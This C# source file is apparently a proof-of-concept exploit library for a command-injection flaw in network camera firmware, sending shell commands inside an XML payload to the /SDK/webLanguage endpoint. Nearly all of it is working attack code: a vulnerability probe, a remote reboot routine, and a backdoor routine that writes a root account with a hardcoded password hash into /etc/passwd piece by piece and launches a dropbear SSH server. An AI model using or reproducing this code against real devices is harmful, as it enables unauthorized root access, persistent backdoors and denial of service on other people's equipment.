using System;
using System.Collections.Generic;
using System.Diagnostics.Contracts;
using System.IO;
using System.Linq;
using System.Net;
using System.Runtime.CompilerServices;
using System.Security.Cryptography;
using System.Text;
using System.Threading.Tasks;

namespace Attacker36260Lib
{
    public class PoC36260Attacker
    {
        private HttpClient _client;
        private IPAddress _target;
        private VulnerableCode _isVerify;
        private string _proto;
        public readonly string Template = "<?xml version=\"1.0\" encoding=\"UTF-8\"?><language>$({0})</language>";
        public HttpClient Client
        {
            get { return _client; }
        }
        public IPAddress TargetIPAddress
        {
            get { return _target; }
        }
        public VulnerableCode IsVerify
        {
            get { return _isVerify; }
        }
        public string Proto
        {
            get { return _proto; }
        }
        public PoC36260Attacker(HttpClient client, IPAddress target)
        {
            _client = client;
            _target = target;
            _isVerify = VulnerableCode.NotTested;
            _proto = "http";
        }
        private void SwitchProto()
        {
            if (_proto == "http")
            {
                _proto = "https";
            }
            else
            {
                _proto = "http";
            }
        }
        //TODO:Change to async
        public QueryResult SendWeakPointQuery(string querystr)
        {
            if (querystr.Length > 22)
            {
                throw new ArgumentException("Length out of range(Max Length 22 ASCII Chars)");
            }
            string fullquery = String.Format(Template, querystr);
            string tgtUri = _proto + "://" + TargetIPAddress.ToString() + "/SDK/webLanguage";

            try
            {
                HttpResponseMessage respMsg;
                StringContent content = new StringContent(fullquery);
                respMsg = _client.PutAsync(tgtUri, content).Result;
                if (respMsg.StatusCode == HttpStatusCode.Moved)
                {
                    SwitchProto();
                    tgtUri = _proto + "://" + TargetIPAddress.ToString() + "/SDK/webLanguage";
                    respMsg = _client.PutAsync(tgtUri, content).Result;
                }
                return new QueryResult { StatusCode = respMsg.StatusCode, IsReachable = true, RespMsg = respMsg.Content.ReadAsStringAsync().Result };
            }
            catch (HttpRequestException ex)
            {
                return new QueryResult { IsReachable = false, RespMsg = "" };
            }
            catch (Exception ex)
            {
                return new QueryResult { IsReachable = false, RespMsg = "" };
            }
        }
        public QueryResult GetUri(string queryuri)
        {
            string tgtUri = _proto + "://" + TargetIPAddress.ToString() + queryuri;
            try
            {
                HttpResponseMessage respMsg = _client.GetAsync(tgtUri).Result;
                if (respMsg.StatusCode == HttpStatusCode.Moved)
                {
                    SwitchProto();
                    tgtUri = _proto + "://" + TargetIPAddress.ToString() + queryuri;
                    respMsg = _client.GetAsync(tgtUri).Result;
                }
                string nxstr = respMsg.Content.ReadAsStringAsync().Result;
                return new QueryResult { IsReachable = true, StatusCode = respMsg.StatusCode, RespMsg = nxstr };
            }
            catch (HttpRequestException ex)
            {
                return new QueryResult { IsReachable = false, RespMsg = "" };
            }
            catch (Exception ex)
            {
                return new QueryResult { IsReachable = false, RespMsg = "" };
            }
        }
        //status_code == 200 (OK);
        //    Verified vulnerable and exploitable
        //status_code == 500 (Internal Server Error);
        //    Device may be vulnerable, but most likely not
        //    The SDK webLanguage tag is there, but generate status_code 500 when language not found
        //    I.e.Exist: <language>en</language>(200), not exist: <language>EN</language>(500)
        //    (Issue: Could also be other directory than 'webLib', r/o FS etc...)
        //status_code == 401 (Unauthorized);
        //    Defiantly not vulnerable
        //*Directly reseting tcp is also not vulnerable.
        //++TODO:Change to async
        public VulnerableCode TestExist()
        {
            QueryResult uploadFileResult = this.SendWeakPointQuery(String.Format("ls>webLib/NX"));
            if (!uploadFileResult.IsReachable)
            {
                _isVerify = VulnerableCode.NotVulnerable;
                return VulnerableCode.NotVulnerable;
            }
            if (!(uploadFileResult.StatusCode == HttpStatusCode.OK || uploadFileResult.StatusCode == HttpStatusCode.InternalServerError))
            {
                _isVerify = VulnerableCode.NotVulnerable;
                return VulnerableCode.NotVulnerable;
            }
            QueryResult getFileResult = GetUri("/NX");
            if (!getFileResult.IsReachable)
            {
                _isVerify = VulnerableCode.NotVulnerable;
                return VulnerableCode.NotVulnerable;
            }
            if (getFileResult.StatusCode == HttpStatusCode.OK)
            {
                _isVerify = VulnerableCode.Vulnerable;
                return VulnerableCode.Vulnerable;
            }
            else
            {
                _isVerify = VulnerableCode.NotVulnerable;
                return VulnerableCode.NotVulnerable;
            }
        }

        public bool RebootRemoteMachine()
        {
            if (TestExist() == VulnerableCode.NotVulnerable)
            {
                return false;
            }
            SendWeakPointQuery("reboot");
            Task.Delay(10).Wait();
            if (!GetUri("/").IsReachable)
            {
                return true;
            }
            else
            {
                return false;
            }
        }
        public bool PullUpSSHShell(string username, string password, int port)
        {
            if (this.TestExist() != VulnerableCode.Vulnerable)
            {
                return false;
            }
            if (this.GetUri("/q").StatusCode == HttpStatusCode.OK)
            {
                return true;
            }
            //username:usrx passwd:114514alice
            string fullAccountInfo = "usrx:$1$yix$n4Y8K.GZWOTF5hc0zgPrt/:0:0:usrx:/:/bin/sh";
            for (int i = 0; i < fullAccountInfo.Length; i += 2)
            {
                string tx = "";
                for (int j = i; j < fullAccountInfo.Length && j < i + 2; j++)
                {
                    tx += fullAccountInfo[j];
                }
                //Console.WriteLine(tx);
                if (i + 2 < fullAccountInfo.Length)
                {
                    SendWeakPointQuery(string.Format("echo -n {0}>>qx", tx));
                }
                else
                {
                    SendWeakPointQuery(string.Format("echo {0}>>qx", tx));
                }
            }
            SendWeakPointQuery("cat qx>webLib/q");
            SendWeakPointQuery("cat qx>>/etc/passwd");
            SendWeakPointQuery(String.Format("dropbear -R -B -p {0}", port));
            return true;
        }
        public bool ForcePullUpSSHShell(string username, string password, int port)
        {
            if (this.TestExist() != VulnerableCode.Vulnerable)
            {
                return false;
            }
            //username:usrx passwd:114514alice
            string fullAccountInfo = "usrx:$1$yix$n4Y8K.GZWOTF5hc0zgPrt/:0:0:usrx:/:/bin/sh";
            for (int i = 0; i < fullAccountInfo.Length; i += 2)
            {
                string tx = "";
                for (int j = i; j < fullAccountInfo.Length && j < i + 2; j++)
                {
                    tx += fullAccountInfo[j];
                }
                //Console.WriteLine(tx);
                if (i + 2 < fullAccountInfo.Length)
                {
                    SendWeakPointQuery(string.Format("echo -n {0}>>qx", tx));
                }
                else
                {
                    SendWeakPointQuery(string.Format("echo {0}>>qx", tx));
                }
            }
            SendWeakPointQuery("cat qx>webLib/q");
            SendWeakPointQuery("cat qx>>/etc/passwd");
            SendWeakPointQuery(String.Format("dropbear -R -B -p {0}", port));
            return true;
        }
    }


    //    status_code == 200 (OK);
    //    Verified vulnerable and exploitable
    //status_code == 500 (Internal Server Error);
    //    Device may be vulnerable, but most likely not
    //    The SDK webLanguage tag is there, but generate status_code 500 when language not found
    //    I.e.Exist: <language>en</language>(200), not exist: <language>EN</language>(500)
    //    (Issue: Could also be other directory than 'webLib', r/o FS etc...)
    //status_code == 401 (Unauthorized);
    //    Defiantly not vulnerable
    //*Directly reseting tcp is also not vulnerable.
    public enum VulnerableCode
    {
        NotVulnerable = 401,
        Vulnerable = 200,
        Unknown = 500,
        NotTested = 0
    }
    public class QueryResult
    {
        public string? RespMsg;
        public HttpStatusCode? StatusCode;
        public bool IsReachable;
    }

}
